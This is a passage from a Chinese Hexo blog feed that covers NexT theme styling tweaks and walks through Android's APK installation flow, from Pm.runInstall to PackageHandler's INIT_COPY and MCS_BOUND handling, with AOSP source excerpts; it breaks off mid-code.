<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// 背景颜色</div><div class="line">$body-bg-color = #f5f5d5;</div><div class="line">$header-bg-color = #f5f5d5;</div><div class="line">$footer-bg-color = #f5f5d5;</div></pre></td></tr></table></figure>
<p>定义完后，其实body的背景已经换了。</p>
<p><strong>头部背景色：</strong></p>
<p>themes/next/source/css/_schemes/Mist/sidebar/_header.styl：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.header &#123; background: $header-bg-color; &#125;</div></pre></td></tr></table></figure>
<p><strong>footer背景色：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.footer &#123;</div><div class="line">  margin-top: 80px;</div><div class="line">  padding: 10px 0;</div><div class="line">  background: $footer-bg-color;</div><div class="line">  color: $grey-dim;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="六、代码风格"><a href="#六、代码风格" class="headerlink" title="六、代码风格"></a>六、代码风格</h1><p>主题_config.yml:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">highlight_theme: night blue</div></pre></td></tr></table></figure>
<h1 id="七、内容宽度"><a href="#七、内容宽度" class="headerlink" title="七、内容宽度"></a>七、内容宽度</h1><p>themes/next/source/css/_variables/custom.styl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// 修改成你期望的宽度</div><div class="line">$content-desktop = 900px</div><div class="line">// 当视窗超过 1600px 后的宽度</div><div class="line">$content-desktop-large = 1100px</div></pre></td></tr></table></figure>
<h1 id="八、文章目录序号关闭"><a href="#八、文章目录序号关闭" class="headerlink" title="八、文章目录序号关闭"></a>八、文章目录序号关闭</h1><p>主题_config.yml:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#Table Of Contents in the Sidebar</div><div class="line">toc:</div><div class="line">  enable: true</div><div class="line"></div><div class="line">  # Automatically add list number to toc.</div><div class="line">  number: false</div></pre></td></tr></table></figure>
<h1 id="九、无序列表"><a href="#九、无序列表" class="headerlink" title="九、无序列表"></a>九、无序列表</h1><p>不喜欢空心的，我们换成实心的列表：</p>
<p>文章列表：<br>source/css/_common/components/post/post-expand.styl:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ul li &#123; list-style: disc; &#125;</div></pre></td></tr></table></figure></p>
<p>页面列表：<br>next/source/css/_custom/custom.styl:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ul &#123;</div><div class="line">list-style-type: disc;  // 空心圆，实心圆为 disc</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>参考：<a href="https://github.com/iissnan/hexo-theme-next/issues/559" target="_blank" rel="external">https://github.com/iissnan/hexo-theme-next/issues/559</a></p>
<h1 id="十、文章访问次数"><a href="#十、文章访问次数" class="headerlink" title="十、文章访问次数"></a>十、文章访问次数</h1><p>主题_config.yml:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">busuanzi_count:</div><div class="line">  # count values only if the other configs are false</div><div class="line">  enable: true</div><div class="line">  # custom uv span for the whole site</div><div class="line">  site_uv: true</div><div class="line">  site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt;访问人数</div><div class="line">  site_uv_footer:</div><div class="line">  # custom pv span for the whole site</div><div class="line">  site_pv: true</div><div class="line">  site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt;总访问量</div><div class="line">  site_pv_footer: 次</div><div class="line">  # custom pv span for one page only</div><div class="line">  page_pv: true</div><div class="line">  page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt;浏览</div><div class="line">  page_pv_footer: 次</div></pre></td></tr></table></figure>
<h1 id="十一、表格样式"><a href="#十一、表格样式" class="headerlink" title="十一、表格样式"></a>十一、表格样式</h1><p>这个背景色下面表格边界不太明显，我们修改为：</p>
<p>next/source/css/_variables/base.styl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">// Table</div><div class="line">// --------------------------------------------------</div><div class="line">$table-width                    = 100%</div><div class="line">$table-border-color             = $grey-dark</div><div class="line">$table-font-size                = 14px</div><div class="line">$table-content-alignment        = left</div><div class="line">$table-content-vertical         = middle</div><div class="line">$table-th-font-weight           = 700</div><div class="line">$table-cell-padding             = 8px</div><div class="line">$table-cell-border-right-color  = $grey-dark</div><div class="line">$table-cell-border-bottom-color = $grey-dark</div><div class="line">$table-row-odd-bg-color         = #f9f9f9</div><div class="line">$table-row-hover-bg-color       = $whitesmoke</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;进一步打造自己的Blog。&lt;/p&gt;
    
    </summary>
    
      <category term="Hexo" scheme="https://maoao530.github.io/categories/Hexo/"/>
    
    
      <category term="hexo" scheme="https://maoao530.github.io/tags/hexo/"/>
    
      <category term="next" scheme="https://maoao530.github.io/tags/next/"/>
    
  </entry>
  
  <entry>
    <title>应用程序安装流程</title>
    <link href="https://maoao530.github.io/2017/01/18/package-install/"/>
    <id>https://maoao530.github.io/2017/01/18/package-install/</id>
    <published>2017-01-18T06:48:01.000Z</published>
    <updated>2017-01-31T06:06:17.219Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍APK的安装流程。</p>
<a id="more"></a>
<h1 id="一、安装流程图"><a href="#一、安装流程图" class="headerlink" title="一、安装流程图"></a>一、安装流程图</h1><p>APK安装流程，总体可以下图流程，用ProcessOn画的，凑合看：</p>
<p><img src="/img/archives/package-install.png" alt="package_install"></p>
<p>从上图我们可以看到apk安装到最后都会调用到这个flow：</p>
<blockquote>
<p>PMS.scanPackageTracedLI =&gt; PMS.scanPackageLI =&gt; PMS.scanPackageDirtyLI</p>
</blockquote>
<p>关于这个flow，之前的博客有详细介绍过，本文不再展开 : <a href="https://maoao530.github.io/2017/01/10/packagemanager/">https://maoao530.github.io/2017/01/10/packagemanager/</a></p>
<p>后续的博文会根据这张图展开说明。</p>
<h1 id="二、APK文件结构"><a href="#二、APK文件结构" class="headerlink" title="二、APK文件结构"></a>二、APK文件结构</h1><p>APK(Android Package)，可以看做是一个zip压缩包，可以通过解压缩工具解开，其文件结构如下：</p>
<table>
<thead>
<tr>
<th>目录 or 文件</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>assert</td>
<td style="text-align:left">存放的原生资源文件,通过AssetManager类访问</td>
</tr>
<tr>
<td>lib</td>
<td style="text-align:left">native库文件</td>
</tr>
<tr>
<td>META-INF</td>
<td style="text-align:left">存放签名信息，用来保证APK包的完整性和系统的安全。系统安装APK时，应用管理器会按照对应算法对包里文件做校验，如果校验结果与META-INF中内容不一致，则不会安装这个APK。</td>
</tr>
<tr>
<td>res</td>
<td style="text-align:left">种资源文件系统会在R.java里面自动生成该资源文件的ID，所以访问这种资源文件比较简单，通过R.XXX.ID即可</td>
</tr>
<tr>
<td>AndroidManifest.xml</td>
<td style="text-align:left">每个应用都必须定义和包含，描述应用的名字、版本权限、引用的库文件等信息。apk中的AndroidManifest.xml经过压缩，可以通过AXMLPrinter2工具解开。</td>
</tr>
<tr>
<td>classes.dex</td>
<td style="text-align:left">是JAVA源码编译后生成的JAVA字节码文件。但Android使用的dalvik虚拟机与标准的JAVA虚拟机不兼容，dex文件与class文件相比，不论是文件结构还是opcode都不一样。</td>
</tr>
<tr>
<td>resources.arsc</td>
<td style="text-align:left">编译后的二进制资源文件。</td>
</tr>
</tbody>
</table>
<h1 id="三、APK安装方法"><a href="#三、APK安装方法" class="headerlink" title="三、APK安装方法"></a>三、APK安装方法</h1><p>APK有下面4种安装方法：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>开机过程中安装</td>
<td style="text-align:left">开机时完成，没有安装界面，如系统应用、其它预置应用</td>
</tr>
<tr>
<td>adb工具安装</td>
<td style="text-align:left">没有安装界面，adb install/push xxxx.apk</td>
</tr>
<tr>
<td>第三方应用安装</td>
<td style="text-align:left">通过packageinstaller.apk进行安装，有安装界面，如打开文件管理器并点击sdk卡里APK文件</td>
</tr>
<tr>
<td>网络下载应用安装</td>
<td style="text-align:left">通过google market应用完成，没有安装界面</td>
</tr>
</tbody>
</table>
<p>简单说明下apk安装的基本过程：</p>
<ul>
<li>拷贝目标apk到指定文件目录</li>
<li>调用scanPackageLI为apk文件在系统中注册信息</li>
</ul>
<h1 id="四、应用程序安装过程"><a href="#四、应用程序安装过程" class="headerlink" title="四、应用程序安装过程"></a>四、应用程序安装过程</h1><p>上述几种安装方法最终都通过PackageManagerService.scanPackageLI完成，总结起来大致有以下三种方式：</p>
<ul>
<li><p><strong>adb push：</strong><br>PackageManagerService的内部类AppDirObserver实现了监听app目录的功能，当把某个APK文件放到app目录下面时，PMS会收到ADD_EVENTS事件<br>frameworks\base\services\java\com\android\server\pm\PackageManagerService.java</p>
</li>
<li><p><strong>adb install：</strong><br>安装入口函数为Pm.runInstall<br>frameworks\base\cmds\pm\src\com\android\commands\pm\Pm.java </p>
</li>
<li><p><strong>网络下载应用安装和第三方应用安装：</strong><br>安装入口函数为ApplicationPackageManager.installPackage<br>frameworks\base\core\java\android\app\ApplicationPackageManager.java</p>
</li>
</ul>
<p>接下来我们来分别详细说明这些安装流程：</p>
<h1 id="五、adb-push"><a href="#五、adb-push" class="headerlink" title="五、adb push"></a>五、adb push</h1><p>Android 4.4平台，PackageManagerService的内部类AppDirObserver实现了监听app目录的功能，当把某个APK文件放到app目录下面时，PMS会收到ADD_EVENTS事件。<br>如果是添加事件，则调用scanPackageLI，并使用updatePermissionsLPw授权；如果是删除事件则调用removePackageLI移除该apk的相关信息。最后都要调用writeLPr重新保存相关信息到packages.xml。</p>
<p>关于AppDirObserver具体如何监听的，可以查看：<a href="http://blog.csdn.net/new_abc/article/details/12949535" target="_blank" rel="external">AppDirObserver</a></p>
<p>不过我在android 7.0 sdk里面没有看到这个类，难道7.0把这个功能砍了？手头没有7.0平台，不好验证。</p>
<p>我猜测现在通过adb push apk到data/app或者system/app的apk，如果这个监听的功能砍了，那么应该是会通过reboot重启系统，走PMS.main流程，scanDir–&gt;scanPackageLI去安装apk。</p>
<p>以上待填坑。</p>
<h1 id="六、adb-install"><a href="#六、adb-install" class="headerlink" title="六、adb install"></a>六、adb install</h1><p>adb install 的安装方式，会调用system/core/adb/commandline.cpp中的adb_commandline函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">adb_commandline</div><div class="line">    install_app_legacy or install_app </div><div class="line">        pm_command</div><div class="line">            send_shell_command</div><div class="line">                Pm.runInstall()</div></pre></td></tr></table></figure></p>
<p>这个过程会把apk文件copy到data/local/tmp/目录下，然后向shell服务发送pm命令安装apk，最后调用<code>Pm.runInstall()</code>方法来安装apk。</p>
<h2 id="6-1-pm-runInstall"><a href="#6-1-pm-runInstall" class="headerlink" title="6.1 pm.runInstall"></a>6.1 pm.runInstall</h2><p>frameworks\base\cmds\pm\src\com\android\commands\pm\Pm.java </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">runInstall</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</div><div class="line">    <span class="keyword">final</span> InstallParams params = makeInstallParams();</div><div class="line">    <span class="comment">// 1. 创建session</span></div><div class="line">    <span class="keyword">final</span> <span class="keyword">int</span> sessionId = doCreateSession(params.sessionParams,</div><div class="line">            params.installerPackageName, params.userId);</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">final</span> String inPath = nextArg();</div><div class="line">        <span class="keyword">if</span> (inPath == <span class="keyword">null</span> &amp;&amp; params.sessionParams.sizeBytes == <span class="number">0</span>) &#123;</div><div class="line">            System.err.println(<span class="string">"Error: must either specify a package size or an APK file"</span>);</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 2. 写session</span></div><div class="line">        <span class="keyword">if</span> (doWriteSession(sessionId, inPath, params.sessionParams.sizeBytes, <span class="string">"base.apk"</span>,</div><div class="line">                <span class="keyword">false</span> <span class="comment">/*logSuccess*/</span>) != PackageInstaller.STATUS_SUCCESS) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 3. 提交Session</span></div><div class="line">        <span class="keyword">if</span> (doCommitSession(sessionId, <span class="keyword">false</span> <span class="comment">/*logSuccess*/</span>)</div><div class="line">                != PackageInstaller.STATUS_SUCCESS) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        System.out.println(<span class="string">"Success"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            mInstaller.abandonSession(sessionId);</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception ignore) &#123;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从上面的代码来看，runInstall主要进行了三件事，即创建session、对session进行写操作，最后提交session。</p>
<h3 id="6-1-1-doCreateSession"><a href="#6-1-1-doCreateSession" class="headerlink" title="6.1.1 doCreateSession"></a>6.1.1 doCreateSession</h3><p>实际调用的是PackageInstallerService的createSession，这个过程主要是为APK安装做好准备工作，例如权限检查、目的临时文件的创建等， 最终创建出PackageInstallerSession对象。PackageInstallerSession可以看做是”安装APK”这个请求的封装，其中包含了处理这个请求需要的一些信息。<br>实际上PackageInstallerSession不仅是分装请求的对象，其自身还是个服务端。</p>
<h3 id="6-1-2-doWriteSession"><a href="#6-1-2-doWriteSession" class="headerlink" title="6.1.2 doWriteSession"></a>6.1.2 doWriteSession</h3><p>通过PackageInstallerSession将/data/local/tmp的apk拷贝到终端目录内。</p>
<h3 id="6-1-3-doCommitSession"><a href="#6-1-3-doCommitSession" class="headerlink" title="6.1.3 doCommitSession"></a>6.1.3 doCommitSession</h3><p>doWriteSession结束后，如果没有出现任何错误，那么APK源文件已经copy到目的地址了，doCommitSession最终会调用到PMS.installStage来安装apk，调用流程如下：</p>
<p><code>PackageInstallerSession.commit ==&gt; commitLocked(); ==&gt; PMS.installStage()</code></p>
<p>PMS.installStage()会调用sendMessage将”INIT_COPY”发送给PackageHandler：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">installStage</span><span class="params">(String packageName, File stagedDir, String stagedCid,</span></span></div><div class="line">        IPackageInstallObserver2 observer, PackageInstaller.SessionParams sessionParams,</div><div class="line">        String installerPackageName, <span class="keyword">int</span> installerUid, UserHandle user,</div><div class="line">        Certificate[][] certificates) &#123;</div><div class="line">    <span class="keyword">if</span> (DEBUG_EPHEMERAL) &#123;</div><div class="line">        <span class="keyword">if</span> ((sessionParams.installFlags &amp; PackageManager.INSTALL_EPHEMERAL) != <span class="number">0</span>) &#123;</div><div class="line">            Slog.d(TAG, <span class="string">"Ephemeral install of "</span> + packageName);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">final</span> VerificationInfo verificationInfo = <span class="keyword">new</span> VerificationInfo(</div><div class="line">            sessionParams.originatingUri, sessionParams.referrerUri,</div><div class="line">            sessionParams.originatingUid, installerUid);</div><div class="line"></div><div class="line">    <span class="keyword">final</span> OriginInfo origin;</div><div class="line">    <span class="keyword">if</span> (stagedDir != <span class="keyword">null</span>) &#123;</div><div class="line">        origin = OriginInfo.fromStagedFile(stagedDir);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        origin = OriginInfo.fromStagedContainer(stagedCid);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">final</span> Message msg = mHandler.obtainMessage(INIT_COPY);</div><div class="line">    <span class="keyword">final</span> InstallParams params = <span class="keyword">new</span> InstallParams(origin, <span class="keyword">null</span>, observer,</div><div class="line">            sessionParams.installFlags, installerPackageName, sessionParams.volumeUuid,</div><div class="line">            verificationInfo, user, sessionParams.abiOverride,</div><div class="line">            sessionParams.grantedRuntimePermissions, certificates);</div><div class="line">    params.setTraceMethod(<span class="string">"installStage"</span>).setTraceCookie(System.identityHashCode(params));</div><div class="line">    msg.obj = params;</div><div class="line"></div><div class="line">    Trace.asyncTraceBegin(TRACE_TAG_PACKAGE_MANAGER, <span class="string">"installStage"</span>,</div><div class="line">            System.identityHashCode(msg.obj));</div><div class="line">    Trace.asyncTraceBegin(TRACE_TAG_PACKAGE_MANAGER, <span class="string">"queueInstall"</span>,</div><div class="line">            System.identityHashCode(msg.obj));</div><div class="line"></div><div class="line">    mHandler.sendMessage(msg);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>PackageHandler用于处理apk的安装请求等消息，后面分析。</p>
<h1 id="七、ApplicationPackageManager"><a href="#七、ApplicationPackageManager" class="headerlink" title="七、ApplicationPackageManager"></a>七、ApplicationPackageManager</h1><p>网络下载应用安装或者通过第三方应用安装，最终都会通过ApplicationPackageManager.installPackage来安装：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installPackage</span><span class="params">(Uri packageURI, PackageInstallObserver observer,</span></span></div><div class="line">            <span class="keyword">int</span> flags, String installerPackageName) &#123;</div><div class="line">        installCommon(packageURI, observer, flags, installerPackageName, mContext.getUserId());</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">installCommon</span><span class="params">(Uri packageURI,</span></span></div><div class="line">        PackageInstallObserver observer, <span class="keyword">int</span> flags, String installerPackageName,</div><div class="line">        <span class="keyword">int</span> userId) &#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="string">"file"</span>.equals(packageURI.getScheme())) &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Only file:// URIs are supported"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">final</span> String originPath = packageURI.getPath();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// PMS.installPackageAsUser</span></div><div class="line">        mPM.installPackageAsUser(originPath, observer.getBinder(), flags, installerPackageName,</div><div class="line">            userId);</div><div class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</div><div class="line">        <span class="keyword">throw</span> e.rethrowFromSystemServer();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>PMS.installPackageAsUser调用sendMessage将”INIT_COPY”发送给PackageHandler:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">installPackageAsUser</span><span class="params">(String originPath, IPackageInstallObserver2 observer,</span></span></div><div class="line">        <span class="keyword">int</span> installFlags, String installerPackageName, <span class="keyword">int</span> userId) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">final</span> Message msg = mHandler.obtainMessage(INIT_COPY);</div><div class="line">    <span class="keyword">final</span> VerificationInfo verificationInfo = <span class="keyword">new</span> VerificationInfo(</div><div class="line">            <span class="keyword">null</span> <span class="comment">/*originatingUri*/</span>, <span class="keyword">null</span> <span class="comment">/*referrer*/</span>, -<span class="number">1</span> <span class="comment">/*originatingUid*/</span>, callingUid);</div><div class="line">    <span class="keyword">final</span> InstallParams params = <span class="keyword">new</span> InstallParams(origin, <span class="keyword">null</span> <span class="comment">/*moveInfo*/</span>, observer,</div><div class="line">            installFlags, installerPackageName, <span class="keyword">null</span> <span class="comment">/*volumeUuid*/</span>, verificationInfo, user,</div><div class="line">            <span class="keyword">null</span> <span class="comment">/*packageAbiOverride*/</span>, <span class="keyword">null</span> <span class="comment">/*grantedPermissions*/</span>,</div><div class="line">            <span class="keyword">null</span> <span class="comment">/*certificates*/</span>);</div><div class="line">    params.setTraceMethod(<span class="string">"installAsUser"</span>).setTraceCookie(System.identityHashCode(params));</div><div class="line">    msg.obj = params;</div><div class="line">    mHandler.sendMessage(msg);</div><div class="line"></div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>PackageHandler用于处理apk的安装请求等消息，后面分析。</p>
<h1 id="八、PackageHanlder"><a href="#八、PackageHanlder" class="headerlink" title="八、PackageHanlder"></a>八、PackageHanlder</h1><ul>
<li>PMS.installStage()会调用sendMessage将”INIT_COPY”发送给PackageHandler</li>
<li>PMS.installPackageAsUser调用sendMessage将”INIT_COPY”发送给PackageHandler</li>
</ul>
<h2 id="8-1-INIT-COPY"><a href="#8-1-INIT-COPY" class="headerlink" title="8.1 INIT_COPY"></a>8.1 INIT_COPY</h2><p>PackageHandler用于处理apk的安装请求等消息，在PMS构造函数中有初始化。实际处理消息的函数为doHandleMessage，我们来看看INIT_COPY的处理流程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageHandler</span> <span class="keyword">extends</span> <span class="title">Handler</span> </span>&#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">doHandleMessage</span><span class="params">(Message msg)</span> </span>&#123;</div><div class="line">        <span class="keyword">switch</span> (msg.what) &#123;</div><div class="line">            <span class="keyword">case</span> INIT_COPY: &#123;</div><div class="line">                <span class="comment">//这里取出的其实就是InstallParams</span></div><div class="line">                HandlerParams params = (HandlerParams) msg.obj;</div><div class="line">                <span class="comment">//idx为当前等待处理处理的安装请求的个数</span></div><div class="line">                <span class="keyword">int</span> idx = mPendingInstalls.size();</div><div class="line">                ............</div><div class="line"></div><div class="line">                <span class="comment">//初始时，mBound的值为false</span></div><div class="line">                <span class="keyword">if</span> (!mBound) &#123;</div><div class="line">                    ............</div><div class="line">                    <span class="comment">// If this is the only one pending we might</span></div><div class="line">                    <span class="comment">// have to bind to the service again.</span></div><div class="line">                    <span class="comment">//连接安装服务</span></div><div class="line">                    <span class="keyword">if</span> (!connectToService()) &#123;</div><div class="line">                        ..................</div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="comment">// Once we bind to the service, the first</span></div><div class="line">                        <span class="comment">// pending request will be processed.</span></div><div class="line">                        <span class="comment">//绑定服务成功后，将新的请求加入到mPendingIntalls中，等待处理</span></div><div class="line">                        mPendingInstalls.add(idx, params);</div><div class="line">                    &#125;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="comment">//如果之前已经绑定过服务，同样将新的请求加入到mPendingIntalls中，等待处理</span></div><div class="line">                    mPendingInstalls.add(idx, params);</div><div class="line">                    <span class="comment">// Already bound to the service. Just make</span></div><div class="line">                    <span class="comment">// sure we trigger off processing the first request.</span></div><div class="line">                    <span class="keyword">if</span> (idx == <span class="number">0</span>) &#123;</div><div class="line">                        <span class="comment">//如果是第一个请求，则直接发送事件MCS_BOUND，触发处理流程</span></div><div class="line">                        mHandler.sendEmptyMessage(MCS_BOUND);</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>INIT_COPY主要是将新的请求加入到mPendingIntalls中，等待MCS_BOUND阶段处理。</p>
<h2 id="8-2-MCS-BOUND"><a href="#8-2-MCS-BOUND" class="headerlink" title="8.2 MCS_BOUND"></a>8.2 MCS_BOUND</h2><p>INIT_COPY最后会发送MCS_BOUND消息触发接下来的流程，MCS_BOUND对应的处理流程同样定义于doHandleMessage中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">doHandleMessage</span><span class="params">(Message msg)</span> </span>&#123;</div><div class="line">    .......</div><div class="line">    <span class="keyword">case</span> MCS_BOUND: &#123;</div><div class="line">        ........</div><div class="line">        <span class="keyword">if</span> (msg.obj != <span class="keyword">null</span>) &#123;</div><div class="line">            mContainerService = (IMediaContainerService) msg.obj;</div><div class="line">            .......</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> 